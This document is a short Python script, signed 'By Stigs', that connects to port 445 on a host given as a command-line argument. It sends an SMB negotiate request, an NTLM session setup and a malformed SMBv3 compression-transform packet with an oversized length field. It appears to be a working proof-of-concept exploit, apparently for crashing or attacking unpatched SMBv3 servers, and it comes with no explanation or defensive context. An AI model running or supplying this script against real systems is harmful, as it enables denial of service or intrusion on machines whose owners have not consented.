import socket
import struct
import sys


request = b'\x00\x00\x00\xc8\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x00\x05\x00\x02\x00\x00\x00\x44\x00\x00\x00\x19\x2a\xae\xbc\x15\x67\x45\xb7\xb5\xed\xdf\x47\x0e\x66\xa1\x98\x70\x00\x00\x00\x03\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00\x26\x00\x00\x00\x00\x00\x01\x00\x20\x00\x01\x00\xe2\x46\x79\xeb\x79\xf6\x69\xf5\xd8\xce\xbc\x0f\x1e\x58\x9a\x9f\x55\x3d\xc9\xd6\x3a\x6f\xbc\x61\x19\x6e\xfc\x72\x5f\x6f\xc9\x8f\x00\x00\x02\x00\x06\x00\x00\x00\x00\x00\x02\x00\x02\x00\x01\x00\x00\x00\x03\x00\x10\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x01\x00\x00\x01\x00\x02\x00\x03\x00'

session = b'\x00\x00\x00\x80\xfe\x53\x4d\x42\x40\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x32\x90\x88\xe2\x00\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x28\x00\x00\x00\x06\x01\xb1\x1d\x00\x00\x00\x0f'

smb3 = b'\x00\x00\x00\xfb\xfc\x53\x4d\x42\xad\x01\x00\x00\x01\x00\xff\xff\xff\xff\xff\xff\xe8\xb0\x00\xfe\x53\x4d\x42\x40\x00\x01\x00\x99\x01\x00\x01\x00\x04\x80\x00\x00\x02\x00\x0b\x00\x29\x02\x60\x0c\x00\x0e\x00\x19\x08\x54\x58\x00\x02\x55\x06\x7e\x4e\x54\x4c\x4d\x53\x53\xa8\x50\x00\x03\x00\x16\x18\x00\x02\x5d\x00\x0e\x8a\xd0\x00\x02\x75\x06\x56\x00\x00\x05\x00\x02\x56\x58\x04\x0f\x01\x1f\x10\x00\x01\x45\x00\x41\x36\x80\x82\x8a\xe2\x06\x01\xb1\x1d\x00\x12\x00\x0f\x29\xc7\x75\x22\xb5\x1b\x60\x00\x88\x93\x1a\xd8\x28\xaa\xac\x29\x80\x1f\x61\x64\x6d\x69\x6e\x00\x14\x00\x00\x01\x4d\xe3\x5d\x25\xb8\x0b\x1a\x00\x46\xd1\xfe\xbb\x69\x58\xa0\xec\x02\x01\x04\x8e\x81\x25\xa2\x09\x76\xfa\x00\xd5\x01\x9c\xd7\xd6\x05\x35\x80\x04\x3d\x18\x03\xe0\x1e\x00\x44\x00\x45\x00\x00\x53\x00\x4b\x00\x54\x00\x4f\x00\x00\x50\x00\x2d\x00\x56\x00\x52\x41\x80\x04\x41\x00\x34\x00 \x35\x80\x02\x01\x15\x9e\x10\x04\x9e\x10\x03\x9e\x10\x07\x00\x08\x0d\x86\x4f\x06\x80\x28\x09\xbc\x67\xab\x6f\xce\x00\x33\x9d\x13\xbb\xce\x55\xff\x48\x00\xed\x1d\xd3\x8d'

sock = socket.socket(socket.AF_INET)
sock.settimeout(3)
sock.connect(( sys.argv[1],  445 ))
sock.send(request)
sock.send(session)
sock.send(smb3)



# By Stigs
